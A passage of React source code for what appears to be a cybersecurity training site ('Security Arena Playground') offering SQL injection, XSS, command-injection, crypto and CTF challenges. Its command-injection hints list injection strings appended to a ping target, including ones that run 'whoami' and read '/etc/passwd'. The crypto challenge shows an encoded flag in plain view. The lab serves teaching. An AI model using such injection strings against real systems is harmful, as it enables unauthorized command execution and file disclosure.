                  <p className="text-gray-400 text-sm mb-2 font-medium">Command that will be executed:</p>
                  <div className="bg-black/30 p-3 rounded border border-white/5">
                    <code className="text-green-400 text-sm font-mono">
                      ping -c 4 {commandInput || '[IP_ADDRESS]'}
                    </code>
                  </div>
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Terminal className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Execute Ping'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1; ls</code></li>
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1 && whoami</code></li>
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1 || cat /etc/passwd</code></li>
                    <li className="list-disc">Try: <code className="text-green-400">127.0.0.1 | id</code></li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'crypto':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-purple-500/10 border-purple-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-purple-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-purple-500 to-pink-500 rounded-l-xl" />
                <p className="text-gray-400 mb-4 ml-4">
                  Decrypt the following message to find the flag:
                </p>
                <div className="ml-4 bg-black/30 p-4 rounded-lg border border-purple-500/10">
                  <code className="text-purple-400 text-sm font-mono">
                    Encrypted: RkxBR3tDUllQVDBfTTRTVDNSXzIwMjZ9
                  </code>
                </div>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-white font-medium mb-2">Your Answer:</label>
                  <input
                    type="text"
                    value={cryptoInput}
                    onChange={(e) => setCryptoInput(e.target.value)}
                    placeholder="Enter decrypted message or flag..."
                    className="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-3 text-white font-mono focus:outline-none focus:border-purple-500/50 transition-colors"
                    disabled={isSolved || !isLoggedIn}
                  />
                </div>

                <Button
                  onClick={handleChallengeSubmit}
                  className="w-full"
                  disabled={isSolved || !isLoggedIn}
                  leftIcon={<Lock className="w-4 h-4" />}
                >
                  {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Submit Answer'}
                </Button>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <p className="text-sm text-gray-400 mb-3 font-semibold flex items-center gap-2">
                    <Info className="w-4 h-4" />
                    Hints:
                  </p>
                  <ul className="text-sm text-gray-500 space-y-2 ml-6">
                    <li className="list-disc">Try: <code className="text-purple-400">Base64 decoding</code></li>
                    <li className="list-disc">Try: <code className="text-purple-400">Caesar cipher</code></li>
                    <li className="list-disc">Look for patterns in the encrypted text</li>
                    <li className="list-disc">The flag format is: FLAG{'{...}'}</li>
                  </ul>
                </div>
              </div>
            </div>
          </motion.div>
        );

      case 'ctf':
        return (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6"
          >
            <div className="rounded-xl border border-white/5 bg-white/[0.02] p-8">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className={`p-3 rounded-lg border ${isSolved ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-purple-500/10 border-purple-500/20'}`}>
                    <Icon className={`w-6 h-6 ${isSolved ? 'text-emerald-400' : 'text-purple-400'}`} />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">{activeChallenge.title}</h3>
                    <p className="text-sm text-gray-500">{activeChallenge.description}</p>
                  </div>
                </div>
                {isSolved && (
                  <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-4 py-2">
                    <CheckCircle className="w-5 h-5 text-emerald-400" />
                    <span className="text-emerald-400 font-bold text-sm">Solved</span>
                  </div>
                )}
              </div>

              <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.01] mb-6">
                <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-purple-500 to-pink-500 rounded-l-xl" />
                <p className="text-gray-400 ml-4">
                  Find the hidden flag! Combine multiple techniques to discover the secret.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <h4 className="text-white font-bold mb-3">Challenge Info</h4>
                  <ul className="text-sm text-gray-500 space-y-2">
                    <li className="flex items-center gap-2">• Points: <span className="text-purple-400 font-bold">{activeChallenge.points}</span></li>
                    <li className="flex items-center gap-2">• Difficulty: <span className="text-red-400 font-bold">{activeChallenge.difficulty}</span></li>
                    <li>• Category: Web Exploitation</li>
                    <li>• Skills: SQL, XSS, Analysis</li>
                  </ul>
                </div>

                <div className="rounded-lg border border-white/5 bg-white/[0.01] p-4">
                  <h4 className="text-white font-bold mb-3">Objectives</h4>
                  <ul className="text-sm text-gray-500 space-y-2">
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Identify vulnerabilities</li>
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Exploit authentication</li>
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Extract sensitive data</li>
                    <li className="flex items-center gap-2"><CheckCircle className="w-4 h-4 text-gray-600" /> Find the flag</li>
                  </ul>
                </div>
              </div>

              <div className="relative rounded-xl p-6 border border-purple-500/20 bg-gradient-to-br from-purple-500/5 to-pink-500/5 mb-6">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 to-pink-500 rounded-t-xl" />
                <p className="text-white font-bold mb-2 flex items-center gap-2">
                  <Trophy className="w-5 h-5 text-yellow-400" />
                  Master Challenge
                </p>
                <p className="text-gray-400 text-sm leading-relaxed">
                  Use the skills you've learned in previous challenges to find the ultimate flag.
                  The administrator account holds the secret. Good luck, hacker!
                </p>
              </div>

              <Button
                onClick={() => {
                  if (!isLoggedIn) {
                    setShowAuthModal(true);
                    return;
                  }
                  // For CTF, redirect to SQL injection as it's the most common entry point
                  const sqlChallenge = ALL_CHALLENGES.find(c => c.type === 'sql-injection' && !solvedChallenges.includes(c.id));
                  if (sqlChallenge) {
                    setActiveChallenge(sqlChallenge);
                    setShowChallengeModal(true);
                  }
                }}
                variant="outline"
                className="w-full border-white/10"
                disabled={isSolved}
                rightIcon={<ArrowRight className="w-4 h-4" />}
              >
                {!isLoggedIn ? 'Login Required' : isSolved ? 'Challenge Completed' : 'Start Challenge'}
              </Button>
            </div>
          </motion.div>
        );

      default:
        return null;
    }
  };

  // Handle escape key to close modal
  useEffect(() => {
    const handleEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && showChallengeModal) {
        setShowChallengeModal(false);
        setResult(null);
      }
    };

    window.addEventListener('keydown', handleEscape);
    return () => window.removeEventListener('keydown', handleEscape);
  }, [showChallengeModal]);

  // Prevent body scroll when modal is open
  useEffect(() => {
    if (showChallengeModal) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [showChallengeModal]);

  // Memoized filtered challenges
  const filteredChallenges = useMemo(() => {
    let filtered = ALL_CHALLENGES;

    // Apply difficulty filter
    if (filterDifficulty !== 'All') {
      filtered = filtered.filter(challenge => challenge.difficulty === filterDifficulty);
    }

    // Apply type filter
    if (filterType !== 'All') {
      const typeMapping: Record<string, ChallengeType> = {
        'SQL Injection': 'sql-injection',
        'XSS': 'xss',
        'Command Injection': 'command-injection',
        'Crypto': 'crypto',
        'CTF': 'ctf'
      };
      const mappedType = typeMapping[filterType];
      if (mappedType) {
        filtered = filtered.filter(challenge => challenge.type === mappedType);
      }
    }

    // Apply solved filter
    if (!showSolvedChallenges) {
      filtered = filtered.filter(challenge => !solvedChallenges.includes(challenge.id));
    }

    return filtered;
  }, [filterDifficulty, filterType, solvedChallenges, showSolvedChallenges]);

  // Reset visible challenges when filters change
  useEffect(() => {
    setVisibleChallenges(12);
  }, [filterDifficulty, filterType, showSolvedChallenges]);

  return (
    <div className="pt-32 pb-20">
      <div className="container-custom">
        {/* Hero Section - Modern & Clean */}
        <motion.div
          className="text-center mb-24"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
        >
          {/* Accent Line */}
          <div className="w-20 h-1 bg-gradient-to-r from-purple-500 via-violet-500 to-pink-500 mx-auto mb-8 rounded-full" />

          {/* Icon Badge */}
          <div className="inline-flex p-4 rounded-xl border border-purple-500/20 bg-purple-500/5 mb-6">
            <Swords className="w-12 h-12 text-purple-400" />
          </div>

          <h1 className="text-5xl lg:text-6xl font-bold mb-6">
            <span className="text-white/90">Security</span>{' '}
            <span className="bg-gradient-to-r from-purple-400 via-violet-400 to-pink-400 bg-clip-text text-transparent">
              Arena Playground
            </span>
          </h1>

          <p className="text-lg lg:text-xl text-gray-400 max-w-3xl mx-auto leading-relaxed mb-8">
            Interactive cybersecurity laboratory for learning and practicing penetration testing techniques
            in a safe and controlled environment
          </p>

          <div className="flex flex-wrap gap-4 justify-center">
            {isLoggedIn ? (
              <>
                <Button 
                  variant="primary" 
                  size="lg" 
                  rightIcon={<ArrowRight className="w-5 h-5" />}
                  onClick={() => {
                    // Find first unsolved challenge
                    const firstUnsolvedChallenge = ALL_CHALLENGES.find(c => !solvedChallenges.includes(c.id));
                    if (firstUnsolvedChallenge) {
                      setActiveChallenge(firstUnsolvedChallenge);
                      setShowChallengeModal(true);
                    } else {
                      // If all solved, scroll to challenges section
                      const challengesSection = document.getElementById('available-challenges');
                      if (challengesSection) {
                        challengesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                      }
                    }
                  }}
                >
                  Start Learning
                </Button>
                <Button 
                  variant="outline" 
                  size="lg" 
                  className="border-white/10 hover:border-purple-500/30"
                  onClick={() => {
                    const challengesSection = document.getElementById('available-challenges');
                    if (challengesSection) {
                      challengesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }
                  }}
                >
                  View Challenges
                </Button>
              </>
            ) : (
              <>
                <Button
                  variant="primary"
                  size="lg"
                  onClick={() => setShowAuthModal(true)}
                  leftIcon={<Lock className="w-5 h-5" />}
                >
                  Login to Start
                </Button>
                <Button
                  variant="outline"
                  size="lg"
                  className="border-white/10 hover:border-purple-500/30"
                  onClick={() => {
                    const challengesSection = document.getElementById('available-challenges');
                    if (challengesSection) {
                      challengesSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }
                  }}
                >
                  View Challenges
                </Button>
              </>
            )}
          </div>
        </motion.div>

        {/* Score Board - Clean Stats Grid */}
        <motion.div
          className="grid grid-cols-1 md:grid-cols-3 gap-4 lg:gap-6 mb-24"
          variants={staggerContainer}
          initial="hidden"
          whileInView="visible"
          viewport={{ once: true }}
        >
          {[
            { icon: Trophy, value: score, label: 'Total Points', iconColor: 'text-yellow-400' },
            { icon: Star, value: solvedChallenges.length, label: 'Challenges Solved', iconColor: 'text-purple-400' },
            { icon: Flag, value: ALL_CHALLENGES.length, label: 'Total Challenges', iconColor: 'text-emerald-400' }
          ].map((stat, idx) => {
            const Icon = stat.icon;
            return (
              <motion.div
                key={idx}
                className="relative rounded-xl p-6 text-center border border-white/5 hover:border-purple-500/20 transition-all duration-300 bg-white/[0.02] hover:bg-white/[0.05] group"
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: idx * 0.1 }}
                whileHover={{ y: -4 }}
              >
                <Icon className={`w-8 h-8 mx-auto mb-3 ${stat.iconColor}`} />
                <div className="text-3xl lg:text-4xl font-bold bg-gradient-to-br from-white to-gray-400 bg-clip-text text-transparent mb-2">
                  {stat.value}
                </div>
                <div className="text-xs text-gray-500 font-medium uppercase tracking-wide">
                  {stat.label}
                </div>
                <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-0 h-[2px] bg-gradient-to-r from-purple-500 to-pink-500 group-hover:w-3/4 transition-all duration-500" />
              </motion.div>
            );
          })}
        </motion.div>

        {/* Progress by Difficulty */}
        <motion.div
          className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-24"
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
        >
          {[
            { diff: 'Easy', color: 'bg-emerald-500' },
            { diff: 'Medium', color: 'bg-yellow-500' },
            { diff: 'Hard', color: 'bg-orange-500' },
            { diff: 'Expert', color: 'bg-red-500' }
          ].map(({ diff, color }) => {
            const totalChallenges = ALL_CHALLENGES.filter(c => c.difficulty === diff).length;
            const solvedCount = ALL_CHALLENGES.filter(c => c.difficulty === diff && solvedChallenges.includes(c.id)).length;
            const percentage = totalChallenges > 0 ? Math.round((solvedCount / totalChallenges) * 100) : 0;

            return (
              <div key={diff} className="rounded-xl border border-white/5 bg-white/[0.02] p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-white font-bold text-sm">{diff}</span>
                  <span className="text-gray-500 text-xs">{solvedCount}/{totalChallenges}</span>
                </div>
                <div className="w-full bg-white/[0.05] rounded-full h-2 mb-2">
                  <div
                    className={`${color} h-2 rounded-full transition-all duration-500`}
                    style={{ width: `${percentage}%` }}
                  />
                </div>
                <span className="text-xs text-gray-500">{percentage}% Complete</span>
              </div>
            );
          })}
        </motion.div>

        {/* Section Title */}
        <SectionTitle
          subtitle="Training Arena"
          title="Challenge Categories"
          className="mb-12"
        />

        {/* Challenge Categories - Grid */}
        <motion.div
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-20"
          variants={staggerContainer}
          initial="hidden"
          whileInView="visible"
          viewport={{ once: true }}
        >
          {[
            {
              type: 'sql-injection' as ChallengeType,
              title: 'SQL Injection',
              description: 'Master database exploitation techniques and learn to identify SQL vulnerabilities',
              icon: Database,
              gradient: 'from-blue-500 to-cyan-500',
              techniques: ['Union-based', 'Blind SQLi', 'Error-based', 'Time-based'],
              difficulty: 'Beginner to Expert',
              totalChallenges: 25
            },
            {
              type: 'xss' as ChallengeType,
              title: 'Cross-Site Scripting',
              description: 'Learn to inject and execute malicious JavaScript in web applications',
              icon: Code,
              gradient: 'from-orange-500 to-red-500',
              techniques: ['Reflected XSS', 'Stored XSS', 'DOM XSS', 'Filter Bypass'],
              difficulty: 'Beginner to Expert',
              totalChallenges: 25
            },
            {
              type: 'command-injection' as ChallengeType,
              title: 'Command Injection',
              description: 'Execute unauthorized system commands and achieve remote code execution',
              icon: Terminal,
              gradient: 'from-green-500 to-emerald-500',
              techniques: ['OS Commands', 'Code Injection', 'RCE', 'Reverse Shell'],
              difficulty: 'Beginner to Expert',
              totalChallenges: 25
            },
            {
              type: 'ctf' as ChallengeType,
              title: 'CTF Challenges',
              description: 'Complete multi-step Capture The Flag scenarios combining various techniques',
              icon: Flag,
              gradient: 'from-purple-500 to-pink-500',
              techniques: ['Web Exploit', 'Multi-step', 'Real Scenarios', 'Advanced'],
              difficulty: 'Intermediate to Expert',
              totalChallenges: 10
            }
          ].map((category) => {
            const Icon = category.icon;
            const categoryCompleted = ALL_CHALLENGES.filter(
              c => c.type === category.type && solvedChallenges.includes(c.id)
            ).length;
            const categoryTotal = ALL_CHALLENGES.filter(c => c.type === category.type).length;
            const completionRate = categoryTotal > 0 ? Math.round((categoryCompleted / categoryTotal) * 100) : 0;

            return (
              <motion.div
                key={category.type}
                variants={staggerItem}
                whileHover={{ y: -8 }}
                className="group"
              >
                <div className="relative rounded-xl p-6 border border-white/5 bg-white/[0.02] hover:bg-white/[0.05] hover:border-purple-500/20 transition-all h-full flex flex-col">
                  {/* Top gradient line */}
                  <div className={`absolute top-0 left-0 right-0 h-1 bg-gradient-to-r ${category.gradient} rounded-t-xl opacity-0 group-hover:opacity-100 transition-opacity`} />

                  <div className="flex items-start justify-between mb-4">
                    <div className={`p-3 rounded-lg border border-white/5 bg-gradient-to-br ${category.gradient} bg-opacity-10`}>
                      <Icon className="w-6 h-6 text-white" />
                    </div>
                    {categoryCompleted > 0 && (
                      <div className="flex flex-col items-end gap-1">
                        <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-full px-2.5 py-1">
                          <span className="text-xs text-emerald-400 font-bold">
                            {categoryCompleted}/{categoryTotal}
                          </span>
                        </div>
                        <span className="text-xs text-gray-500">{completionRate}%</span>
                      </div>
                    )}
                  </div>

                  <h3 className="text-lg font-bold text-white mb-2 group-hover:text-purple-400 transition-colors">
                    {category.title}
                  </h3>
                  <p className="text-gray-500 text-sm mb-4 leading-relaxed flex-1">
                    {category.description}
                  </p>

                  {/* Techniques */}
                  <div className="mb-4">
                    <div className="flex items-center gap-2 mb-2">
                      <Award className="w-3.5 h-3.5 text-purple-400" />
                      <span className="text-xs text-gray-400 font-semibold">Techniques:</span>
                    </div>
                    <div className="flex flex-wrap gap-1.5">
                      {category.techniques.map((tech, i) => (
                        <span
                          key={i}
                          className="text-xs px-2 py-1 rounded-md bg-white/[0.03] border border-white/5 text-gray-400"
                        >
                          {tech}
                        </span>
                      ))}
                    </div>
                  </div>

                  {/* Stats */}
                  <div className="space-y-2 pt-4 border-t border-white/5">
                    <div className="flex items-center justify-between text-xs">
                      <span className="text-gray-500 flex items-center gap-1.5">
                        <TrendingUp className="w-3.5 h-3.5" />
                        Difficulty:
                      </span>
                      <span className="text-purple-400 font-medium">{category.difficulty}</span>
                    </div>
                    <div className="flex items-center justify-between text-xs">
                      <span className="text-gray-500 flex items-center gap-1.5">
                        <Trophy className="w-3.5 h-3.5" />
                        Total Challenges:
                      </span>
                      <span className="text-white font-bold">{category.totalChallenges}</span>
                    </div>
                  </div>

                  {/* Progress Bar */}
                  {categoryCompleted > 0 && (
                    <div className="mt-4 pt-4 border-t border-white/5">
                      <div className="flex items-center justify-between text-xs mb-2">
                        <span className="text-gray-500">Your Progress</span>
                        <span className="text-emerald-400 font-bold">{completionRate}%</span>
                      </div>
                      <div className="w-full bg-white/[0.05] rounded-full h-1.5">
                        <div
                          className={`bg-gradient-to-r ${category.gradient} h-1.5 rounded-full transition-all duration-500`}
                          style={{ width: `${completionRate}%` }}
                        />
                      </div>
                    </div>
                  )}
                </div>
              </motion.div>
            );
          })}
        </motion.div>

        {/* Available Challenges Section */}
        <div id="available-challenges" className="scroll-mt-24">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.3 }}
          >
            <SectionTitle
              subtitle="Practice Arena"
              title="Available Challenges"
              className="mb-8"
            />
          </motion.div>

        {/* Toggle and Filters */}
        <motion.div 
          className="flex flex-wrap gap-4 mb-8 items-center justify-between"
          initial={{ opacity: 0, y: 10 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.2 }}
        >
          <div className="flex flex-wrap gap-4">
            <div className="flex gap-2">
              <span className="text-gray-400 text-sm font-medium py-2">Difficulty:</span>
              {['All', 'Easy', 'Medium', 'Hard', 'Expert'].map((diff) => (
                <button
                  key={diff}
                  onClick={() => {
                    setFilterDifficulty(diff);
                    setVisibleChallenges(12);
                  }}
                  className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${filterDifficulty === diff
                      ? 'bg-purple-500 text-white'
                      : 'bg-white/[0.02] text-gray-400 hover:bg-white/[0.05] border border-white/5'
                    }`}
                >
                  {diff}
                </button>
              ))}
            </div>

            <div className="flex gap-2">
              <span className="text-gray-400 text-sm font-medium py-2">Type:</span>
              {['All', 'SQL Injection', 'XSS', 'Command Injection', 'Crypto', 'CTF'].map((type) => (
                <button
                  key={type}
                  onClick={() => {
                    setFilterType(type);
                    setVisibleChallenges(12);
                  }}
                  className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${filterType === type
                      ? 'bg-purple-500 text-white'
                      : 'bg-white/[0.02] text-gray-400 hover:bg-white/[0.05] border border-white/5'
                    }`}
                >
                  {type}
                </button>
              ))}
            </div>
          </div>

          {/* Toggle Show/Hide Solved */}
          <div className="flex items-center gap-3 bg-white/[0.02] border border-white/5 rounded-lg px-4 py-2">
            <span className="text-sm text-gray-400 font-medium">
              {showSolvedChallenges ? 'Hide Solved' : 'Show All'}
            </span>
            <button
              onClick={() => setShowSolvedChallenges(!showSolvedChallenges)}
              className={`relative w-12 h-6 rounded-full transition-colors ${showSolvedChallenges ? 'bg-purple-500' : 'bg-gray-600'
                }`}
            >
              <div
                className={`absolute top-0.5 left-0.5 w-5 h-5 rounded-full bg-white transition-transform ${showSolvedChallenges ? 'translate-x-6' : 'translate-x-0'
                  }`}
              />
            </button>
          </div>
        </motion.div>

        {/* Challenges Grid */}
        {filteredChallenges.length > 0 ? (
          <motion.div
            key={`${filterDifficulty}-${filterType}-${showSolvedChallenges}`}
            className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            {filteredChallenges
              .slice(0, visibleChallenges)
            .map((challenge) => {
              const Icon = challenge.icon;
              const isSolved = solvedChallenges.includes(challenge.id);

              return (
                <div
                  key={challenge.id}
                  className={`group relative rounded-xl border transition-all duration-300 overflow-hidden ${isSolved
                      ? 'border-emerald-500/30 bg-emerald-500/5'
                      : isLoggedIn
                        ? 'border-white/5 bg-white/[0.02] hover:bg-white/[0.05] hover:border-purple-500/20 cursor-pointer'
                        : 'border-white/5 bg-white/[0.02] opacity-60 cursor-not-allowed'
                    }`}
                  onClick={() => {
                    if (!isLoggedIn) {
                      setShowAuthModal(true);
                      return;
                    }
                    if (!isSolved) {
                      setActiveChallenge(challenge);
                      setResult(null);
                      setSqlQuery('');
                      setXssInput('');
                      setCommandInput('');
                      setCryptoInput('');
                      setShowChallengeModal(true);
                    }
                  }}
                >
                  {/* Top indicator for solved */}
                  {isSolved && (
                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-emerald-500 to-green-500" />
                  )}

                  <div className="p-6">
                    {/* Header Section */}
                    <div className="flex items-start justify-between mb-4">
                      <div className="flex items-start gap-3 flex-1 min-w-0">
                        <div className={`p-3 rounded-lg border flex-shrink-0 ${isSolved
                            ? 'bg-emerald-500/10 border-emerald-500/20'
                            : 'bg-purple-500/10 border-purple-500/20'
                          }`}>
                          <Icon className={`w-5 h-5 ${isSolved ? 'text-emerald-400' : 'text-purple-400'}`} />
                        </div>

                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 mb-1 flex-wrap">
                            <h3 className="text-white font-bold text-base leading-tight">
                              {challenge.title}
                            </h3>
                            {isSolved && (
                              <div className="flex items-center gap-1 bg-emerald-500/10 border border-emerald-500/20 rounded-full px-2 py-0.5">
                                <CheckCircle className="w-3.5 h-3.5 text-emerald-400" />
                                <span className="text-xs text-emerald-400 font-bold">Solved</span>
                              </div>
                            )}
                          </div>

                          {/* Type Badge */}
                          <span className="inline-block text-xs text-gray-500 font-medium">
                            {challenge.type === 'sql-injection' ? 'SQL Injection' :
                              challenge.type === 'xss' ? 'Cross-Site Scripting' :
                                challenge.type === 'command-injection' ? 'Command Injection' :
                                  challenge.type === 'crypto' ? 'Cryptography' :
                                    'Capture The Flag'}
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* Description */}
                    <p className="text-gray-400 text-sm mb-4 leading-relaxed line-clamp-2">
                      {challenge.description}
                    </p>

                    {/* Footer Section */}
                    <div className="flex items-center justify-between pt-4 border-t border-white/5">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className={`inline-flex items-center px-2.5 py-1 rounded-full text-xs font-semibold ${challenge.difficulty === 'Easy' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
                            challenge.difficulty === 'Medium' ? 'bg-yellow-500/10 text-yellow-400 border border-yellow-500/20' :
                              challenge.difficulty === 'Hard' ? 'bg-orange-500/10 text-orange-400 border border-orange-500/20' :
                                'bg-red-500/10 text-red-400 border border-red-500/20'
                          }`}>
                          {challenge.difficulty}
                        </span>
                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-purple-500/10 border border-purple-500/20">
                          <Trophy className="w-3 h-3 text-purple-400" />
                          <span className="text-xs text-purple-400 font-bold">{challenge.points} pts</span>
                        </span>
                      </div>

                      {!isSolved && !isLoggedIn && (
                        <div className="flex items-center gap-1.5 text-amber-400 text-sm font-semibold">
                          <Lock className="w-4 h-4" />
                          <span className="hidden sm:inline text-xs">Login Required</span>
                        </div>
                      )}

                      {!isSolved && isLoggedIn && (
                        <div className="flex items-center gap-1.5 text-purple-400 text-sm font-semibold group-hover:gap-2 transition-all">
                          <span className="hidden sm:inline">Start</span>
                          <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              );
            })}
          </motion.div>
        ) : (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-center py-12"
          >
            <div className="inline-flex p-6 rounded-full bg-white/[0.02] border border-white/5 mb-4">
              <Info className="w-8 h-8 text-gray-500" />
            </div>
            <h3 className="text-xl font-bold text-white mb-2">No Challenges Found</h3>
            <p className="text-gray-400 mb-6">
              No challenges match your current filters.
            </p>
            <Button
              onClick={() => {
                setFilterDifficulty('All');
                setFilterType('All');
                setShowSolvedChallenges(true);
              }}
              variant="outline"
              className="border-white/10"
            >
              Reset Filters
            </Button>
          </motion.div>
        )}

        {/* View More Button */}
        {(() => {

          return visibleChallenges < filteredChallenges.length && (
            <div className="flex flex-col items-center gap-4 mb-20">
              <Button
                onClick={() => setVisibleChallenges(prev => prev + 12)}
                variant="outline"
                size="lg"
                className="border-white/10 hover:border-purple-500/30"
              >
                View More Challenges ({filteredChallenges.length - visibleChallenges} remaining)
              </Button>
              <button
                onClick={() => setVisibleChallenges(filteredChallenges.length)}
                className="text-sm text-gray-400 hover:text-purple-400 transition-colors"
              >
                Show All ({filteredChallenges.length} total)
              </button>
            </div>
          );
        })()}

        {visibleChallenges >= filteredChallenges.length && filteredChallenges.length > 12 && (
          <div className="flex justify-center mb-20">
            <button
              onClick={() => setVisibleChallenges(12)}
              className="text-sm text-gray-400 hover:text-purple-400 transition-colors flex items-center gap-2"
            >
              <span>Show Less</span>
              <ArrowRight className="w-4 h-4 rotate-[-90deg]" />
            </button>
          </div>
        )}
        </div>
      </div>

      {/* Challenge Modal */}
      <AnimatePresence>
        {showChallengeModal && activeChallenge && (
          <>
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50"
              onClick={() => {
                setShowChallengeModal(false);
                setResult(null);
              }}
            />

            {/* Modal Content */}
            <div className="fixed inset-0 z-50 overflow-y-auto">
              <div className="flex min-h-full items-center justify-center p-4">
                <motion.div
                  initial={{ opacity: 0, scale: 0.95, y: 20 }}
                  animate={{ opacity: 1, scale: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95, y: 20 }}
                  className="relative w-full max-w-4xl"
                  onClick={(e) => e.stopPropagation()}
                >
                  <div className="relative rounded-2xl border border-white/10 bg-gradient-to-b from-[#0A0A0A] to-[#111111] shadow-2xl">
                    {/* Modal Header */}
                    <div className="flex items-center justify-between p-6 border-b border-white/10">
                      <div className="flex items-center gap-4 flex-1">
                        <div className="p-3 rounded-xl bg-purple-500/10 border border-purple-500/20">
                          <activeChallenge.icon className="w-6 h-6 text-purple-400" />
                        </div>
                        <div className="flex-1">
                          <h2 className="text-2xl font-bold text-white mb-2">{activeChallenge.title}</h2>
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className={`inline-flex items-center px-2.5 py-1 rounded-full text-xs font-semibold ${activeChallenge.difficulty === 'Easy' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
                                activeChallenge.difficulty === 'Medium' ? 'bg-yellow-500/10 text-yellow-400 border border-yellow-500/20' :
                                  activeChallenge.difficulty === 'Hard' ? 'bg-orange-500/10 text-orange-400 border border-orange-500/20' :
                                    'bg-red-500/10 text-red-400 border border-red-500/20'
                              }`}>
                              {activeChallenge.difficulty}
                            </span>
                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-purple-500/10 border border-purple-500/20">
                              <Trophy className="w-3 h-3 text-purple-400" />
                              <span className="text-xs text-purple-400 font-bold">{activeChallenge.points} pts</span>
                            </span>
                            <span className="text-xs text-gray-500 font-medium">
